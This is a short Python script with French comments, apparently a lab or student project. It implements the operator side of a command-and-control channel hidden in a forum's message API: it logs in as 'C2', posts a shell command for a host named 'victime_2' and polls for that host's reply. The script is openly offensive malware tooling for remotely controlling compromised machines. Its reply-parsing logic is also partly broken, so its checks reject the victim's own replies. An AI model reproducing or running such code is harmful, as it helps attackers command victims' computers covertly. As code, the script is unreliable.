import requests
import time

class Forum:
    def __init__(self, ip, port, user, password, name_victime="victime_2"):
        self.ip = ip
        self.port = port
        self.user = user
        self.password = password
        self.find = False
        self.num_commande = 1
        self.name = name_victime

        # dernier message connu
        self.last = {'body': 'vide', 'id': 0, 'username': 'C2'}

    def generate_user_key(self):
        # génère un token
        response = requests.post(
            f"http://{self.ip}:{self.port}/api/auth/login",
            json={"username": self.user, "password": self.password},
        )
        response.raise_for_status()
        return response.json()["token"]

    def execute(self, commande):
        self.find = False
        token = self.generate_user_key()

        # 1. Récupère tous les messages pour connaître le dernier id de la victime
        response = requests.get(
            f"http://{self.ip}:{self.port}/api/messages",
            headers={"Authorization": f"Bearer {token}"},
        )
        messages = response.json()
        last_id = max((m["id"] for m in messages if m["username"] == self.name), default=0)

        # 2. Envoie la commande
        requests.post(
            f"http://{self.ip}:{self.port}/api/messages",
            headers={"Authorization": f"Bearer {token}"},
            json={"body": commande},
        )

        # Attendre une réponse de la victime avec un id > last_id
        while not self.find:
            response = requests.get(
                f"http://{self.ip}:{self.port}/api/messages",
                headers={"Authorization": f"Bearer {token}"},
            )
            messages = response.json()

            for message in messages:
                if message["username"] == self.name and message["id"] > last_id:
                    # nouveau message trouvé
                    self.last = message.copy()
                    print("nouveau message trouvé :", self.last)
                    self.find = True
                    break

            if not self.find:
                print("not find, attente 10s...")
                time.sleep(10)

        print("coucou")
        #extraire les donner du retour
        try:
            parts = self.last['body'].split("];")
            # parts exemple:
            # ['[FROM=C2', '[TO=victime_2', '[SEQ=42', ' commande...']
            if len(parts) < 4:
                return None, None

            from_part = parts[0]  # "[FROM=C2"
            to_part = parts[1]  # "[TO=victime_2"
            seq_part = parts[2]  # "[SEQ=42"
            cmd_part = "];".join(parts[3:]).strip()

            sender = from_part.split("=", 1)[1].rstrip("]")
            target = to_part.split("=", 1)[1].rstrip("]")
            seq = seq_part.split("=", 1)[1].rstrip("]")

            if sender != self.name or target != self.user:
                return None, None

            self.num_commande += 1
            return "coucou"

        except Exception:
            return None, None


# utilisation
print("coucou")
victime_2 = Forum("192.168.1.8", 6000, "C2", "testtest", "victime_2")
print(victime_2.execute("dir"))
